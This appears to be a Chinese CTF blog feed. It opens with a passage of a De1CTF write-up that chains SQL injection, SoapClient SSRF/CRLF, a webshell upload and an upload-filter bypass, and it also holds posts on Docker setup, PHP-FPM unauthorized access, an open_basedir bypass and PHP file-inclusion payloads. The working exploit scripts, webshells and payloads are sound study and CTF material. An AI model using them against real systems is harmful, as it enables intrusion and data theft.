其调用了config.php中写好的insert方法： 12345678910public function insert($columns,$table,$values)&#123; $column = $this-&gt;get_column($columns); $value = '('.preg_replace('/`([^`,]+)`/','\'$&#123;1&#125;\'',$this-&gt;get_column($values)).')'; $nid = $sql = 'insert into '.$table.'('.$column.') values '.$value; $result = $this-&gt;conn-&gt;query($sql); return $result; &#125; 上面insert方法中调用了get_column方法： 123456789private function get_column($columns)&#123; if(is_array($columns)) $column = ' `'.implode('`,`',$columns).'` '; else $column = ' `'.$columns.'` '; return $column; &#125; 相关函数：(1). implode ( string $glue , array $pieces ) : string glue：默认为空的字符串。 pieces：你想要转换的数组。 返回一个字符串，其内容为由 glue 分割开的数组的值。 get_column目的为：将数组元素/元素的两边用反引号引起来，并用逗号连接起来，例如： 1234567891011function get_column($columns)&#123; if(is_array($columns)) $column = ' `'.implode('`,`',$columns).'` '; else $column = ' `'.$columns.'` '; return $column;&#125;echo get_column(array('a','b','c')); 运行结果： `a`,`b`,`c` 处理后的值会经过preg_replace： $value = &apos;(&apos;.preg_replace(&apos;/`([^`,]+)`/&apos;,&apos;\&apos;${1}\&apos;&apos;,$this-&gt;get_column($values)).&apos;)&apos;;意思就是 如果两个反引号中间没有反引号和逗号，那么就将反引号替换为单引号(${1}即向后引用，是对前面括号中所捕获的匹配的引用)，例如： 123&lt;?php$value = '('.preg_replace('/`([^`,]+)`/','\'$&#123;1&#125;\'','`a`, `b`, `c`').')';echo $value; 运行结果： (&apos;a&apos;, &apos;b&apos;, &apos;c&apos;)4.可以发现在register时会用check_username将输入的username进行检测，password会经过md5加密，那么register基本不存在注入了。往下看，有个publish方法，里面也用到了insert： 1234567891011121314if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; if(isset($_POST['signature']) &amp;&amp; isset($_POST['mood'])) &#123; $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip()))); $db = new Db(); @$ret = $db-&gt;insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood)); if($ret) return true; else return false; &#125; &#125; 可以发现插入的值有个是$_POST[&#39;signature&#39;]，而程序并没有对这个值进行特殊处理，那么此处便存在sql注入了： 调用config.php的insert语句为： @$ret = $db-&gt;insert(array(&apos;userid&apos;,&apos;username&apos;,&apos;signature&apos;,&apos;mood&apos;),&apos;ctf_user_signature&apos;,array($this-&gt;userid,$this-&gt;username,$_POST[&apos;signature&apos;],$mood));config.php定义的insert方法为： public function insert($columns,$table,$values)那么： $columns = array(&apos;userid&apos;,&apos;username&apos;,&apos;signature&apos;,&apos;mood&apos;) $table = &apos;ctf_user_signature&apos; $values = array($this-&gt;userid,$this-&gt;username,$_POST[&apos;signature&apos;],$mood)其插入的语句为： $sql = &apos;insert into &apos;.$table.&apos;(&apos;.$column.&apos;) values &apos;.$value;那么当调用publish方法时，插入的语句实际为： $sql = &apos;insert into ctf_user_signature (&apos;userid&apos;,&apos;username&apos;,&apos;signature&apos;,&apos;mood&apos;) values ($this-&gt;userid,$this-&gt;username,$_POST[&apos;signature&apos;],$mood)我们可控的变量$_POST[&#39;signature&#39;]会经过三次检测转换： 1. addslashes 2. explode 3. preg_replace如果构造的数据为： a`, 0xaaa)%23那么不会经过addslashes转换，会经过explode变成： `a`, 0xaaa)%23`再经过preg_replace变成： &apos;a&apos;, 0xaaa)%23`那么，我们可以以此进行盲注： step1.利用md5截断脚本进行注册登录 step2.在publish时抓包，编写时间盲注脚本： 1234567891011121314151617import requestsurl = 'http://127.0.0.1:11027/index.php?action=publish'headers = &#123;'Cookie': 'PHPSESSID=pa7lrc27bj6d5oik7s2f1d6163'&#125;name = ''for position in range(1,33): for num in range(0,128): data = &#123;'signature':"hhh`, case when ascii(substr((select password from ctf_users limit 0,1) from %d))=%d then sleep(5) else 0 end)#"%(position,num), 'mood': 0&#125; #data = &#123;'signature':"hhh`, case when ascii(substr((select username from ctf_users limit 0,1) from %d))=%d then sleep(5) else 0 end)#"%(position,num), 'mood': 0&#125; try: req = requests.post(url, data=data, headers=headers,timeout=4) #print(req.text) except Exception as e: name += chr(num) print(chr(num),end='') break 得到admin密码：c991707fdf339958eded91331fb11ba0，解密MD5得到明文jaivypassword 但是若直接使用admin账号密码登录，会提示： You can only login at the usual address因为allow_diff_ip被设为了0，而且有个allow_diff_ip方法： 123456789101112131415161718function allow_diff_ip_option() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; if(isset($_POST['adio']))&#123; $db = new Db(); @$ret = $db-&gt;update_single('ctf_users',"id = $this-&gt;userid",'allow_diff_ip',(int)$_POST['adio']); if($ret) return true; else return false; &#125; &#125; else echo 'admin can\'t change this option'; return false; &#125; 可以得出，无法直接以管理员的身份登录、更改is_admin的值 5.在showmess方法中，存在着反序列化漏洞： 1234567891011121314151617181920212223242526function showmess() &#123; if(!$this-&gt;check_login()) return false; if($this-&gt;is_admin == 0) &#123; //id,sig,mood,ip,country,subtime $db = new Db(); @$ret = $db-&gt;select(array('username','signature','mood','id'),'ctf_user_signature',"userid = $this-&gt;userid order by id desc"); if($ret) &#123; $data = array(); while ($row = $ret-&gt;fetch_row()) &#123; $sig = $row[1]; $mood = unserialize($row[2]); $country = $mood-&gt;getcountry(); $ip = $mood-&gt;ip; $subtime = $mood-&gt;getsubtime(); $allmess = array('id'=&gt;$row[3],'sig' =&gt; $sig, 'mood' =&gt; $mood, 'ip' =&gt; $ip, 'country' =&gt; $country, 'subtime' =&gt; $subtime); array_push($data, $allmess); &#125; $data = json_encode(array('code'=&gt;0,'data'=&gt;$data)); return $data; &#125; else return false; &#125; 已存在的类中没有发现可以利用的类，但查看phpinfo可以知道开启了soap扩展，于是可以利用SoapClient类(恶补了一下SOAP和CRLF~)： SQL Injection -&gt; unserialize -&gt; CRLF+SSRF通过SSRF，我们可以实现登录admin：在一个浏览器(A)登录自己的账号，在另一个浏览器(B)打开登录页面，将其验证码和Cookie记录下来，之后爆破验证码；之后使用其Cookie和code构造序列化，payload： 123456&lt;?php $location = "http://127.0.0.1/index.php?action=login";$uri = "http://127.0.0.1/";$event = new SoapClient(null,array('user_agent'=&gt;"test\r\nCookie: PHPSESSID=8fgr7r5ul750ad13slbuqiqsa6\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nusername=admin&amp;password=jaivypassword&amp;code=10094305&amp;",'location'=&gt;$location,'uri'=&gt;$uri));$c = (serialize($event));echo bin2hex($c); 将生成的payload用浏览器A publish，payload会插入到数据库中；之后访问action=index，目的是为了触发反序列化，反序列化会触发SSRF+CRLF，会发出“使用浏览器B存在的SESSID在内网进行admin登录”的POST请求，那么新的session记录会被记录在以浏览器B的SESSID为名的session文件中；之后直接在浏览器B刷新页面，会发现已经登录了admin 6.之后可以直接上传一句话木马文件；在Ubuntu下可以使用weevely来连接shell， 使用命令： find / -name &apos;flag&apos;并没有找到flag，查看本机ip： 之后尝试扫描内网ip： 发现172.16.54.2:80，访问，并将内容写入到html文件中： 之后访问/upload/index.html，获得源码： 1234567891011121314151617181920212223242526272829&lt;?php$sandbox = '/var/sandbox/' . md5("prefix" . $_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if($_FILES['file']['name'])&#123; $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name']; if (!is_array($filename)) &#123; $filename = explode('.', $filename); &#125; $ext = end($filename); if($ext==$filename[count($filename) - 1])&#123; die("try again!!!"); &#125; $new_name = (string)rand(100,999).".".$ext; move_uploaded_file($_FILES['file']['tmp_name'],$new_name); $_ = $_POST['hello']; if(@substr(file($_)[0],0,6)==='@&lt;?php')&#123; if(strpos($_,$new_name)===false) &#123; include($_); &#125; else &#123; echo "you can do it!"; &#125; &#125; unlink($new_name);&#125;else&#123; highlight_file(__FILE__);&#125; 相关函数：(1)end():函数将内部指针指向数组中的最后一个元素，并输出(2)file():将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内(3)explode():把字符串打散为数组 首先，检查是否POST file，有的话就直接获取到filename，没有的话就获取上传的文件名$_FILES[‘file’][‘name’] $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];然后会判断文件名是不是数组格式的，如果不是则用explode进行转换： if (!is_array($filename)) { $filename = explode(&apos;.&apos;, $filename); }之后取数组的最后一个元素，作为$ext： $ext = end($filename);进行判断 if($ext==$filename[count($filename) - 1]){ die(&quot;try again!!!&quot;); }正常上传一个文件名为a.txt的文件，那么$filename会为： [0]=&gt;&apos;a&apos; [1]=&gt;&apos;txt&apos;count($filename)-1等于1，那么$filename[count($filename) - 1]为txt，$ext为txt，则两者相等，因此需要想办法绕过判断 可以使$filename数组中最后一个元素的键为非连续的值，从而使$filename[count($filename) - 1]为空，因为有这句话： $filename = !empty($_POST[&apos;file&apos;]) ? $_POST[&apos;file&apos;] : $_FILES[&apos;file&apos;][&apos;name&apos;];因此可以在上传的同时POST值： file[0]=a file[&apos;a&apos;]=php这样，$filename就等于上面的两个元素，$ext为php，$filename[count($filename) - 1]为空，这样便绕过了第一个判断 将上传的文件的文件名改为随机生成的文件名： $new_name = (string)rand(100,999).&quot;.&quot;.$ext; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;],$new_name);判断以POST hello的值为文件名的文件的内容前六个字符是否为@&lt;?php，并且随机生成的文件名不能等于POST hello的值 $_ = $_POST[&apos;hello&apos;]; if(@substr(file($_)[0],0,6)===&apos;@&lt;?php&apos;){ if(strpos($_,$new_name)===false) { include($_);包含以POST hello的值为文件名的文件后，会删除这个随机生成的文件名的文件： unlink($new_name);如果绕过了unlink，那么就能使用存在的文件绕过判断，只需将文件名后加上/.即可 开始想写python脚本的，发现内网只能运行python3，而且不存在requests包，就直接用curl命令；首先在一个文件中写入shell： a.txt： @&lt;?php system(&apos;ls /&apos;); ?&gt;之后： curl &apos;http://172.16.54.2&apos; -o &apos;index.html&apos; -X POST -F file[0]=a -F file[&apos;a&apos;]=php/. -F &apos;file=@get.txt&apos;此时查看/upload/index.html，发现Warnning中出现随机生成的文件名： Warning: unlink(237.php/.): Not a directory in /var/www/html/index.php on line 25那么接下来利用这个文件： curl &apos;http://172.16.54.2&apos; -o &apos;index.html&apos; -X POST -F file[0]=a -F file[&apos;a&apos;]=php/. -F &apos;file=@get.txt&apos; -F hello=237.php刷新/upload/index.html，即可看到命令执行的结果 查找flag文件： find / -name &apos;*flag*&apos;查看flag： cat /etc/flag_is_He4e_89587236.txt weevely这个工具相当于中国菜刀，记录一下安装和使用方法： $git clone https://github.com/epinna/weevely3 $cd weevely3 # Make sure that the python package manager and yaml libraries are installed $ sudo apt-get install -y g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev # Install requirements from within the weevely3/ folder $ cd weevely3/ $ sudo pip install -r requirements.txt --upgrade最后一步进行安装python的包时，提示ERROR: Cannot uninstall &#39;PyYAML&#39;.，将上述最后一步改成： sudo python -m pip install -r requirements.txt --upgrade --ignore-installed PyYAML使用：1.生成木马文件 $ ./weevely.py generate mypassword agent.php2.连接 $ ./weevely.py http://target/agent.php mypassword3.按两次tab键可以列出可以使用的命令]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu18.04 docker的安装与使用]]></title>
    <url>%2F2019%2F08%2F07%2FUbuntu18-04-docker%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[学习学习docker以备搭建题目环境 docker的一些基本概念1.镜像：可认为是超轻量级的虚拟机的快照 2.容器：可认为是超轻量级的虚拟机，是镜像运行起来所处的可读写的状态；容器里面可安装、运行程序，还可以把安装好的程序存储起来获得新的镜像；一个容器通常只运行一个程序 docker的相关命令1.安装： sudo apt install docker.io2.查看docker的信息： sudo docker info3.启动： sudo systemctl start docker4.重启： sudo systemctl restart docker5.停止： sudo systemctl top docker6.查看运行状态： sudo systemctl status dockerdocker镜像相关命令1.查看所有下载的镜像： sudo docker images2.搜索镜像： sudo docker search 镜像名称3.获取镜像： sudo docker pull 镜像名称4.运行镜像： sudo docker run -d --name 容器名称 -p 80:80 镜像名称其中： -d：后台运行 -name：容器名称(自己命名) -p：指定docker运行此镜像所使用的端口，第一个是外网端口，第二个是内网端口 5.删除镜像： sudo docker rmi IMAGE-ID/name其中，IMAGE-ID可在镜像列表中查看；只需使用IMAGE ID前四位即可；也可以使用镜像的名字 docker容器相关命令1.查看容器列表： sudo docker ps -a2.停止容器： sudo docker stop CONTAINER-ID/name其中，CONTAINER ID可在容器列表中查看；只需使用CONTAINER ID前四位即可；也可以使用运行镜像时所命名的容器名字 3.运行容器： sudo docker start CONTAINER-ID/name4.删除容器(容器需已停止运行)： sudo docker rm CONTAINER-ID/name5.当自定义的容器名存在时，不能用重复的名字，如docker-nginx去运行一个镜像，否则会报错： └─(14:51:56)──&gt; sudo docker run --name docker-nginx -p 100:100 nginx docker: Error response from daemon: Conflict. The container name &quot;/docker-nginx&quot; is already in use by container &quot;55d6d83d8db6072ea8c57d03acdd6780259a695d14a5d4fc4d986fed79b39d17&quot;. You have to remove (or rename) that container to be able to reuse that name. See &apos;docker run --help&apos;.可使用stop命令来停止运行： sudo docker stop 55d6/docker-nginx停止运行后，删除此容器： sudo rm stop 55d6/docker-nginx之后便可使用docker-nginx容器名去运行一个镜像 6.进入容器(不知道什么原因，使用docker attach命令无法进入到容器中～) sudo docker exec -it CONTAINER-ID/name /bin/bash退出：exit或Ctrl+D 在容器中的修改不会影响原有镜像 添加docker权限给当前用户上述命令都需要sudo，有些麻烦，直接使用下面这条命令： sudo usermod -aG docker 当前用户名之后重新登录该用户即可直接使用docker命令 自定义镜像1.将容器提交成一个镜像： docker commit CONTAINER-ID/name 镜像名称2.使用dockerfile dockerfile相当于镜像的配置文件；可以通过写一个dockerfile，之后编译这个文件来创建一个自定义镜像，编译命令(在dockerfile目录下执行)： docker build -t 镜像名称 .dockerfile中的一些指令： FROM：FROM debian:stretch表示以debian:stretch作为基础镜像进行构建 RUN：RUN后面跟着待执行的shell命令 ARG：可以进行一些宏定义，比如ENV JAVA_HOME=/opt/jdk，之后RUN后面的shell命令中的${JAVA_HOME}都会被/opt/jdk代替 ENV：在shell中设置一些环境变量 FROM…AS…：给这个阶段的镜像起个别名：FROM …(基础镜像) AS …(别名)，在后面引用这个阶段的镜像时直接使用别名就可以了 COPY：复制文件，COPY . /root/workspace/agent表示将当前文件夹的所有文件拷贝到容器的/root/workspace/agent文件夹中。通过--from参数也可以从前面阶段的镜像中拷贝文件过来，比如--from=builder表示文件来源不是本地文件系统，而是之前的别名为builder的容器 WORKDIR：在执行RUN后面的shell命令前会先cd进WORKDIR后面的目录 ENTRYPOINT：这个参数表示镜像的“入口”，镜像打包完成之后，使用docker run命令运行这个镜像时，其实就是执行这个ENTRYPOINT后面的可执行文件（一般是一个shell脚本文件），也可以通过[“可执行文件”, “参数1”, “参数2”]这种方式来赋予可执行文件的执行参数，这个“入口”执行的工作目录也是WORKDIR后面的那个目录 使用dockerfile部署题目以De1CTF的SSRF Me这道题的dockerfile为例：(https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/web/SSRF%20Me/docker.zip) 1.将dockerr.zip下载下来，解压打开，里面有一个dockerfile文件和一些源码文件2.查看dockerfile文件： FROM tiangolo/uwsgi-nginx-flask:python2.7 WORKDIR /app COPY ./ssrf_me /app RUN mv /app/sources.list /etc/apt/sources.list RUN apt-get update &amp;&amp; apt-get install -y sudo RUN python2 -m pip install flask RUN sudo uwsgi -d /app/uwsgi.ini 根据第三步COPY ./ssrf_me /app，可以得出dockerfile需要在ssrf_me目录外执行，那么先新建一个文件夹ssrf，将dockerfile文件和ssrf_me文件夹移动到里面，结构如下： ┌─(~/桌面/ssrf)──────────────────────────────────(gtfly@ubuntu:pts/0)─┐ └─(10:09:12)──&gt; tree ──(四,8月08)─┘ . ├── dockerfile └── ssrf_me ├── app.py ├── code.txt ├── flag.txt ├── requirements.txt ├── sources.list └── uwsgi.ini 1 directory, 7 files之后在dockerfile目录下执行： docker build -t ssrf .执行成功后即可找到这个ssrf镜像： docker images运行这个镜像： docker run -d -name ssrfme -p 100:80 ssrf之后在本地浏览器访问127.0.0.1:100即可 docker-compose的安装与使用dockerfile记录单个镜像的构建过程，docker-compose.yml记录一个项目(多个镜像)的构建过程 安装： sudo apt install docker-compose运行yml(在docker-compose.yml目录执行)： docker-compose up -d列出所有运行容器： docker-compose ps查看服务日志： docker-compose logs启动指定服务已存在的容器(不加名称的话则启动所有容器，下同)： docker-compose start 容器名称停止已运行的服务的容器： docker-compose stop 容器名称删除指定的服务的容器： docker-compose rm 容器名称使用docker-compose.yml部署题目以De1CTF ShellShellShell这道题的docker-compose.yml为例：https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/web/ShellShellShell/dockerfile 下载解压后，在docker-compose.yml目录下执行： docker-compose up -d之后，查看容器： └─(11:10:08)──&gt; docker-compose ps ──(四,8月08)─┘ Name Command State Ports ------------------------------------------------------------------------------- dockerfile_getshell_1 /bin/bash Up 80/tcp dockerfile_jaivyweb1_1 bash /run.sh Up 0.0.0.0:11027-&gt;80/tcp, 8080/tcp那么在本地浏览器访问127.0.0.1:11027即可 参考链接：https://blog.csdn.net/qq_33256688/article/details/80319673https://www.jianshu.com/p/658911a8cff3https://buzheng.org/linux/how-to-install-and-use-docker-compose-on-ubuntu-18-04/#docker-compose-%E5%85%A5%E9%97%A8]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP CGI、FastCGI、FPM与FPM未授权访问]]></title>
    <url>%2F2019%2F08%2F02%2Fphp-cgi%E3%80%81fastcgi%E3%80%81fpm%E3%80%81cli%E5%85%B3%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[得好好理一理这些都是什么东西了…… 在整个网站架构中，Web Server只是内容的分发者，当访问静态文件，例如.html文件时，Web Server会去文件系统中找到这个文件，发送给浏览器； 当访问动态文件，例如.php时，Web Server根据配置知道这个不是静态文件，需要去找php解析器来处理 Moduleapache中存在Module加载方式，这种方式的本质是把php作为apache的一个子模块来运行；当通过web访问php文件时，apache就会调用module来解析php代码 CGICGI，Common Gatewag interface，即通用网关接口；是Web Server与Web Application之间数据交换的一种协议； CGI方式在遇到连接请求先要创建CGI的子进程，激活一个CGI进程，然后处理请求，处理完后结束这个子进程 请求流程为： 客户端 -》服务器 -》CGI -》应用程序(php) -》CGI -》服务器 -》客户端使用CGI时，每一个web请求都必须解析php.ini、载入全部扩展并初始化全部数据结构，这是CGI性能底下的主要原因(反复加载) FastCGIFastCGI：是用来提高CGI性能的一种协议 Web Server启动时载入FastCGI进程管理器，FastCGI进程管理器自身初始化，启动多个CGI解释器进程，并等待来自Web Server的连接 使用FastCGI，解析php.ini、载入全部扩展并初始化全部数据结构这些工作只在进程启动时发生一次；当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器；Web Server将CGI环境变量和标准输入发送到FastCGI子进程php-cig PHP-CGI是php对Web Server提供的CGI协议的接口程序 PHP-FPMFPM，FastCGI Process Manager，是FastCGI协议解析器，FPM按照FastCGI协议将TCP流解析成真正的数据；PHP-FPM是php对于Web Server提供的FastCGI协议的接口程序 php5.3版本之后，PHP-FPM是内置于PHP的；PHP-FPM通过生成新的子进程可以实现php.ini修改后的平滑重启 php到底用的上面哪种类型的接口程序，可直接在phpinfo的Server API中找到 PHP-FPM未授权访问先上ph大神文章链接：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html；按照思路自己理解理解。。。 1.PHP-FPM解析FastCGI数据包后，会根据得到的环境变量，执行SCRIPT_FILENAME项所指向的PHP文件；后来FPM配置中新增了一个选项security.limit_extensions，其限定了只有某些后缀的文件才允许被FPM执行，默认为.php 2.PHP.INI的两个配置项： auto_prepend_file：告诉PHP在执行目标文件之前，先包含此配置所指定的文件 auto_append_file：告诉PHP在执行完目标文件后，包含此配置所指定的文件 3.PHP-FPM的两个环境变量(可以用来设置PHP配置项)： PHP_VALUE：可以设置模式为PHP_INI_USER PHP_ADMIN_VALUE：可以设置所有选项(除disable_functions，该选项是PHP加载的时候就确定了) 4.根据上述知识点，利用PHP-FPM执行任意代码： (1)PHP-FPM端口(默认9000)暴露在公网(SSRF)(2)找到一个已存在的PHP文件的绝对路径，如/usr/local/lib/php/PEAR.php(3)使用PHP_ADMIN_VALUE设置auto_prepend_file=php://input和allow_url_include=On(4)将需要执行的代码POST到指定的PHP文件中 测试如下： 1.首先配置PHP-FPM监听端口： cd /etc/php/7.0/fpm/pool.d vi www.conf设置：listen=0.0.0.0:9000(以前默认是/run/php/php7.0-fpm.sock) 之后重启FPM：systemctl restart php7.0-fpm.service 2.其次配置nginx： location ~ \.php$ { include snippets/fastcgi-php.conf; fastcgi_pass 0.0.0.0:9000;之后重启nginx，开放阿里端口 3.clone p牛编好的exp,修改后运行： python3 php-fpm.py 101.132.41.135 /var/www/index.php -c &apos;&lt;?php echo `ls`; ?&gt;&apos;即可看到代码执行的结果 参考链接：https://segmentfault.com/a/1190000008627499https://www.php.cn/php-weizijiaocheng-392861.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php bypass open_basedir]]></title>
    <url>%2F2019%2F08%2F01%2Fphp-bypass-open-basedir%2F</url>
    <content type="text"><![CDATA[该配置可将php可以访问的文件限制在指定的目录树中，包括文件本身 在windows下，用分号分隔目录；在其他系统上，用冒号分隔目录 使用open_basedir制定的限制是一个目录名，这意味着若open_basedir=/dir/include，那么/dir/includes也是可以访问的(如果存在)；如果只想限制对指定目录的访问，要以斜线结尾，例如open_basedir=/dir/incl/ bypass open_basedir现在php.ini中设置open_basedir=/var/www/html:/tmp；如果现在有木马文件： pre.php： 1&lt;?php eval($_POST['t']); ?&gt; 那么当POSTt=print_r(scandir(&#39;/&#39;));时，会报出以下错误： Warning: scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html:/tmp) in /var/www/html/pre.php(2) : eval()&apos;d code on line 1 Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/pre.php(2) : eval()&apos;d code on line 1 Warning: scandir(): (errno 1): Operation not permitted in /var/www/html/pre.php(2) : eval()&apos;d code on line 1bypass poc如下(原理详见飘零大佬文章)： t=chdir(&apos;/tmp&apos;); mkdir(&apos;test&apos;); chdir(&apos;test&apos;); ini_set(&apos;open_basedir&apos;,&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); ini_set(&apos;open_basedir&apos;,&apos;/&apos;); var_dump(ini_get(&apos;open_basedir&apos;)); var_dump(glob(&apos;*&apos;));POST上述数据后，即可看到显示出了根目录的所有文件 glob函数： glob() 函数返回匹配指定模式的文件名或目录。 该函数返回一个包含有匹配文件 / 目录的数组。如果出错返回 false。 例如，可以查找当前目录以php结尾的文件：print_r(glob(&#39;./*.php&#39;)); 如果flag文件a存在于根目录下，那么可以构造如下poc进行读取(根据文件a在数组中出现的位置)： t=chdir(&apos;/tmp&apos;); mkdir(&apos;test&apos;); chdir(&apos;test&apos;); ini_set(&apos;open_basedir&apos;,&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); chdir(&apos;..&apos;); ini_set(&apos;open_basedir&apos;,&apos;/&apos;); var_dump(ini_get(&apos;open_basedir&apos;)); show_source(glob(&apos;*&apos;)[&apos;0&apos;]);]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php文件包含漏洞]]></title>
    <url>%2F2019%2F07%2F30%2Fphp%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[系统学习学习文件包含漏洞 文件包含函数以下四个函数的作用均为：包含并运行指定文件 include()：未找到文件会发出一条警告 require()：未找到文件会发出一个致命错误下面两个函数作用类似上面的，区别是如果文件已被包含过，则不会再次包含： include_once() require_once()支持的协议和封装协议官方文档描述： PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 file:// — 访问本地文件系统 http:// — 访问 HTTP(s) 网址 ftp:// — 访问 FTP(s) URLs php:// — 访问各个输入/输出流（I/O streams） zlib:// — 压缩流 data:// — 数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流可以在phpinfo中的Registered PHP Streams中找到可使用的协议 测试代码： 1234&lt;?php$file = $_GET['file'];include($file);?&gt; 下面利用上述代码，来了解文件包含中常用的协议 php://php://inputphp://input是个可以访问请求的原始数据的只读流，将POST的数据作为代码执行； 需要配置：allow_url_include: On 例如，利用上述代码和此协议查看phpinfo信息，则构造 ?file=php://input并且POST数据： &lt;?=phpinfo()?&gt;即可实现；除此之外，比较常见的场景： 123456&lt;?php$txt = $_GET["txt"];if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome"))&#123; echo "flag";&#125; 此时，用php://input协议： ?txt=php://input并且POST数据welcome即可轻松绕过 php://filterphp://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用 一般利用此方式读取文件源码： ?file=php://filter/read=convert.base64-encode/resource=./include.phpread=可以省去不写： ?file=php://filter/convert.base64-encode/resource=./include.phpfile://file://协议用于访问本地文件系统，例如： ?file=file:///var/www/html/index.php如果题目检测file参数开始内容，如/或../时，可以考虑用此协议 data://和php://类似，将原本的include的文件流重定向到了用户可控制的输入流中 需要配置：allow_url_fopen: On，allow_url_include: On 1.执行代码 ?file=data:text/plain,&lt;?=phpinfo()?&gt; ?file=data://text/plain,&lt;?=phpinfo()?&gt;2.base64解码 ?file=data:text/plain;base64,Njk2ZTY0NjU3ODJlNzA2ODcw ?file=data://text/plain;base64,Njk2ZTY0NjU3ODJlNzA2ODcw下面的这个场景除了使用php://input绕过外，还可使用data://绕过： 123456&lt;?php$txt = $_GET["txt"];if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome"))&#123; echo "flag";&#125; 构造： ?txt=data://text/plain,welcomephar://如果目标服务器有zip压缩包，且压缩文件内容有可利用的代码，那么可以利用此协议： 将phpinfo.txt写入&lt;?=phpinfo?&gt;，之后将其压缩为phpinfo.zip，之后使用phar://协议访问： ?file=phar://phpinfo.zip/phpinfo.txt (相对路径) ?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt (绝对路径)可以成功将phpinfo.txt当做php文件执行；当然，可以将phpinfo.txt和phpinfo.zip后缀名替换成其他的： ?file=phar://phpinfo.png/phpinfo一般利用场景(可能需结合文件上传)： 1234&lt;?php$file = $_GET['file'].".php"; //限制只能包含php后缀的文件。include($file);?&gt; zip://zip://与phar://作用类似，不过zip://需要绝对路径： ?file=zip:///var/www/html/phpinfo.zip#phpinfo.txt#需要url编码： ?file=zip:///var/www/html/phpinfo.zip%23phpinfo.txtsession包含http://www.gtfly.top/2019/05/11/PHP-session文件包含 phpinfo+文件包含如果给了phpinfo路径和存在文件包含漏洞，那么通过phpinfo可以知道session、日志等相关信息，可以尝试进行session或日志文件包含；除此之外，可以利用phpinfo页面特性来getshell 原理(转自ph师傅)： 在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是/tmp/php[6个随机字符]），文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。 同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，自然也包含临时文件名。 在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。 但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。 这个时候就需要用到条件竞争，具体流程如下： 发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据 因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大 php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接 所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包 此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell 利用： 127.0.0.1下存在phpinfo.php和include.php，将exp.py中的路径修改后，在终端运行： python include_phpinfo.py 127.0.0.1 80 200 成功getshell显示： └─(10:17:03)──&gt; python include_phpinfo.py 127.0.0.1 80 200 LFI With PHPInfo() -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Getting initial offset... found [tmp_name] at 110231 Spawning worker pool (200)... 243 / 1000 Got it! Shell created in /tmp/g Woot! \m/ Shuttin&apos; down...即可利用/tmp/g文件执行任意命令： http://127.0.0.1/include.php?file=/tmp/g&amp;1=system(%27ls%27); 